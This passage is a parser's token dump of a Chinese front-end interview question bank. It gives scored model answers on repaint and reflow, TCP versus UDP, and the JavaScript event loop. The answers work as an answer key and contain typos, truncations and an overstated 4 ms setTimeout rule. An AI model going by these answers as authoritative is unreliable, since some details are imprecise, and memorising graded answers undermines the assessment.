什么是重绘和回流及怎么减少重绘和回流？\\n\\n","depth":2,"text":"什么是重绘和回流及怎么减少重绘和回流？","tokens":[{"type":"text","raw":"什么是重绘和回流及怎么减少重绘和回流？","text":"什么是重绘和回流及怎么减少重绘和回流？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。\\n\\n- 回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。\\n\\n","task":false,"loose":true,"text":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。\\n","tokens":[{"type":"text","raw":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。\\n","text":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。","tokens":[{"type":"text","raw":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。","text":"重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。","escaped":false}]}]},{"type":"list_item","raw":"- 回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","task":false,"loose":true,"text":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","tokens":[{"type":"text","raw":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","text":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","tokens":[{"type":"text","raw":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","text":"回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## tcp和udp的区别？\\n\\n","depth":2,"text":"tcp和udp的区别？","tokens":[{"type":"text","raw":"tcp和udp的区别？","text":"tcp和udp的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。\\n\\n- CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。\\n\\n- 由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。\\n\\n- TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。\\n\\n- TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。\\n\\n","task":false,"loose":true,"text":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。\\n","tokens":[{"type":"text","raw":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。\\n","text":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。","tokens":[{"type":"text","raw":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。","text":"TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。","escaped":false}]}]},{"type":"list_item","raw":"- CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。\\n\\n","task":false,"loose":true,"text":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。\\n","tokens":[{"type":"text","raw":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。\\n","text":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。","tokens":[{"type":"text","raw":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。","text":"CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。","escaped":false}]}]},{"type":"list_item","raw":"- 由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。\\n\\n","task":false,"loose":true,"text":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。\\n","tokens":[{"type":"text","raw":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。\\n","text":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。","tokens":[{"type":"text","raw":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。","text":"由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。","escaped":false}]}]},{"type":"list_item","raw":"- TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。\\n\\n","task":false,"loose":true,"text":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。\\n","tokens":[{"type":"text","raw":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。\\n","text":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。","tokens":[{"type":"text","raw":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。","text":"TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。","escaped":false}]}]},{"type":"list_item","raw":"- TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","task":false,"loose":true,"text":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","tokens":[{"type":"text","raw":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","text":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","tokens":[{"type":"text","raw":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","text":"TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 浏览器 Eventloop\\n\\n","depth":2,"text":"浏览器 Eventloop","tokens":[{"type":"text","raw":"浏览器 Eventloop","text":"浏览器 Eventloop","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题\\n\\n- **1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为\\n\\n- **1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题\\n\\n","task":false,"loose":true,"text":"**1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题\\n","tokens":[{"type":"text","raw":"**1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题\\n","text":"**1：** 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题","text":" 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题","escaped":false}]}]},{"type":"list_item","raw":"- **1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为\\n\\n","task":false,"loose":true,"text":"**1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为\\n","tokens":[{"type":"text","raw":"**1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为\\n","text":"**1：** JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为","text":" JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","task":false,"loose":true,"text":"**1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","tokens":[{"type":"text","raw":"**1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n\\n 之后打印","text":"**1：** 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 `不得⼩于 4 毫秒`，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 ","text":" 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 ","escaped":false},{"type":"codespan","raw":"`不得⼩于 4 毫秒`","text":"不得⼩于 4 毫秒"},{"type":"text","raw":"，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","text":"，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconsole.log(\'script start\');\\n\\nsetTimeout(function(){\\n    console.log(\'setTimeout\');\\n},0);\\n\\nconsole.log(\'script end\');\\n```","lang":"js","text":"console.log(\'script start\');\\n\\nsetTimeout(function(){\\n    console.log(\'setTimeout\');\\n},0);\\n\\nconsole.log(\'script end\');"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","task":false,"loose":false,"text":"**1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","tokens":[{"type":"text","raw":"**1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","text":"**1：** 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","text":" 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconsole.log(\'script start\');\\n\\nsetTimeout(function () {\\n    console.log(\'setTimeout\');\\n}, 0);\\n\\nnew Promise((resolve) => {\\n    console.log(\'Promise\')\\n    resolve()\\n}).then(function () {\\n    console.log(\'promise1\');\\n}).then(function () {\\n    console.log(\'promise2\');\\n});\\n\\nconsole.log(\'script end\');\\n\\n// 结果\\n// script start => Promise => script end => promise1 => promise2 => setTime\\n```","lang":"js","text":"console.log(\'script start\');\\n\\nsetTimeout(function () {\\n    console.log(\'setTimeout\');\\n}, 0);\\n\\nnew Promise((resolve) => {\\n    console.log(\'Promise\')\\n    resolve()\\n}).then(function () {\\n    console.log(\'promise1\');\\n}).then(function () {\\n    console.log(\'promise2\');\\n});\\n\\nconsole.log(\'script end\');\\n\\n// 结果\\n// script start => Promise => script end => promise1 => promise2 => setTime"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver\\n\\n- **1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver\\n\\n","task":false,"loose":true,"text":"**1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver\\n","tokens":[{"type":"text","raw":"**1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver\\n","text":"**1：** 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver","text":" 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","task":false,"loose":true,"text":"**1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","tokens":[{"type":"text","raw":"**1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","text":"**1：** 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","text":" 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务","text":"注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务","tokens":[{"type":"text","raw":"注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务","text":"注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 正确的⼀次 Event loop 顺序是这样的：\\n\\n    执⾏同步代码，这属于宏任务\\n\\n    执⾏栈为空，查询是否有微任务需要执⾏\\n\\n    执⾏所有微任务\\n\\n    必要的话渲染 UI\\n\\n    然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 正确的⼀次 Event loop 顺序是这样的：\\n\\n    执⾏同步代码，这属于宏任务\\n\\n    执⾏栈为空，查询是否有微任务需要执⾏\\n\\n    执⾏所有微任务\\n\\n    必要的话渲染 UI\\n\\n    然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码","task":false,"loose":true,"text":"**1：** 正确的⼀次 Event loop 顺序是这样的：\\n\\n  